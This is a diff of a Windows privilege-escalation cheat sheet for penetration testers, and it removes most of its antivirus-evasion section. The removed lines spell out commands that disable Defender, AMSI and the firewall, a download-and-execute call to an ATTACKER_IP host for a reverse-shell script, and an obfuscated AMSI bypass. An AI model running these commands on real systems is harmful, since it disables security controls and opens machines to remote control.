@@ -6,12 +6,8 @@
 * [Windows Version and Configuration](#windows-version-and-configuration)
 * [User Enumeration](#user-enumeration)
 * [Network Enumeration](#network-enumeration)
-* [Antivirus & Detections](#antivirus--detections)
-    * [Windows Defender](#windows-defender)
-    * [Firewall](#firewall)
-    * [AppLocker Enumeration](#applocker-enumeration)
-    * [Powershell](#powershell)
-    * [Default Writeable Folders](#default-writeable-folders)
+* [Antivirus Enumeration](#antivirus-enumeration)
+* [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
     * [HiveNightmare](#hivenightmare)
@@ -254,111 +250,12 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
 
-## Antivirus & Detections
+## Antivirus Enumeration
 
 Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
 
-### Windows Defender
 
-```powershell
-# check status of Defender
-PS C:\> Get-MpComputerStatus
-
-# disable scanning all downloaded files and attachments, disable AMSI (reactive)
-PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
-PS C:\> Set-MpPreference -DisableIOAVProtection $true
-
-# disable AMSI (set to 0 to enable)
-PS C:\> Set-MpPreference -DisableScriptScanning 1 
-
-# exclude a folder
-PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
-PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
-PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
-
-# remove signatures (if Internet connection is present, they will be downloaded again):
-PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
-PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
-```
-
-### Firewall
-
-List firewall state and current configuration
-
-```powershell
-netsh advfirewall firewall dump
-# or 
-netsh firewall show state
-netsh firewall show config
-```
-
-List firewall's blocked ports
-
-```powershell
-$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
-```
-
-Disable firewall
-
-```powershell
-# Disable Firewall on Windows 7 via cmd
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-# Disable Firewall on Windows 7 via Powershell
-powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`
-
-# Disable Firewall on any windows via cmd
-netsh firewall set opmode disable
-netsh Advfirewall set allprofiles state off
-```
-
-
-### AppLocker Enumeration
-
-- With the GPO
-- `HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2` (Keys: Appx, Dll, Exe, Msi and Script).
-
-* List AppLocker rules
-    ```powershell
-    PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-    ```
-
-* AppLocker Bypass
-    * By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
-    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
-    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
-    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md
-
-### Powershell
-
-Default powershell locations in a Windows system.
-
-```powershell
-C:\windows\syswow64\windowspowershell\v1.0\powershell
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell
-```
-
-#### Powershell Constrained Mode
-
-* Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`
-* [bypass-clm - PowerShell Constrained Language Mode Bypass](https://github.com/calebstewart/bypass-clm)
-* [PowerShdll - Powershell with no Powershell.exe via DLL's](https://github.com/p3nt4/PowerShdll): `rundll32.exe C:\temp\PowerShdll.dll,main`
-* Other bypasses
-    ```powershell
-    PS > &{ whoami }
-    powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
-    ```
-
-#### AMSI Bypass
-
-Find more AMSI bypass: [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)
-
-```powershell
-PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
-```
-
-
-### Default Writeable Folders
+## Default Writeable Folders
 
 ```powershell
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
